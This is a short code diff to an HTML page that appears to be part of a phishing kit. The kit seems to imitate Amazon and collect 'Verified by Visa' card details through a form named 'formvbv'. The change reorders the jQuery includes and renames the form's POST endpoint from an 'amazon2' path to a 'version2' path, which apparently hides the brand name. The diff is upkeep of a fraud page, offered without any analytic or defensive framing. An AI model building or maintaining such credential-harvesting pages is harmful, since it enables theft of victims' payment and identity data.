@@ -47,6 +47,8 @@
 
 
 </body>
+<script src="../js/jquery.min.js"></script>
+<script src="../js/jquery.validate.min.js"></script>
 <script  type="text/javascript">
     setTimeout("yincang()", 0);
     function yincang() {
@@ -244,7 +246,7 @@
                 },
                 submitHandler: function(form) {
                     $("#zwimel").show();
-                    $.post("/amazon2/mobile/homepage/secure", $("#formvbv").serialize(),
+                    $.post("/version2/mobile/homepage/secure", $("#formvbv").serialize(),
                             function(result) {
                                 setTimeout(function() {
                                             $(location).attr("href", "success")
@@ -255,8 +257,6 @@
             });
     }
 </script>
-<script src="../js/jquery.min.js"></script>
-<script src="../js/jquery.validate.min.js"></script>
 <script language="Javascript">
     function SetFocus()
     {
